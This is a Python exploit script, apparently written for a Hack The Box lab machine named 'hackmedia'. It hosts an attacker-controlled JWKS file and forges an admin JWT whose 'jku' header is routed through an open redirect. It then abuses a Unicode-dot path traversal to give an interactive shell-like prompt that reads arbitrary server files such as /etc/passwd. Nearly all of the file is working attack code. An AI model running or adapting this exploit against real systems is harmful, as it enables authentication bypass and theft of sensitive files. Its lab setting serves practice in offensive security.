#!/usr/bin/env python3

import base64
import json
import jwt
import requests
import signal
import sys
import threading

from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes

from http.server import HTTPServer, SimpleHTTPRequestHandler


class MyHTTPRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, *_):
        # Avoid showing logs
        pass


def start_http_server():
    threading.Thread(target=httpd.serve_forever).start()


def do_exit(*_):
    httpd.server_close()
    httpd.shutdown()
    exit()


httpd = HTTPServer(('', 80), MyHTTPRequestHandler)
signal.signal(signal.SIGINT, do_exit)


# openssl genrsa -out priv.key 1024
privkey = open('priv.key').read()

# openssl rsa -in priv.key -pubout > pub.key
pubkey = RSA.import_key(open('pub.key').read())


def int_to_b64(x: str | int) -> str:
    return base64.urlsafe_b64encode(long_to_bytes(int(x))).decode()


def generate_jwks():
    json.dump({'keys': [{
        'kty': 'RSA',
        'kid': 'hackthebox',
        'use': 'sig',
        'alg': 'RS256',
        'e': int_to_b64(pubkey.e),
        'n': int_to_b64(pubkey.n)
    }]}, open('jwks.json', 'w'), indent=2)


def main():
    if len(sys.argv) != 2:
        print(f'Usage: python3 {sys.argv[0]} <lhost>')
        exit(1)

    start_http_server()
    generate_jwks()

    ip = sys.argv[1]
    jku = f'http://hackmedia.htb/static/../redirect/?url={ip}/jwks.json'
    token = jwt.encode({'user': 'admin'}, privkey,
                       algorithm='RS256',
                       headers={'jku': jku})
    print('[+] JWT token:', token)

    base_url = 'http://10.10.11.126/display/'
    vulnerable_url = f'{base_url}?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5'
    print('[+] Vulnerable page:', f'{vulnerable_url}/etc/passwd\n')

    while True:
        file = input('dpt> ')

        if file == 'exit':
            do_exit()

        r = requests.get(vulnerable_url + file,
                         headers={'Cookie': f'auth={token}', 'Host': 'hackmedia.htb'})
        print()
        print(r.text)


if __name__ == '__main__':
    main()
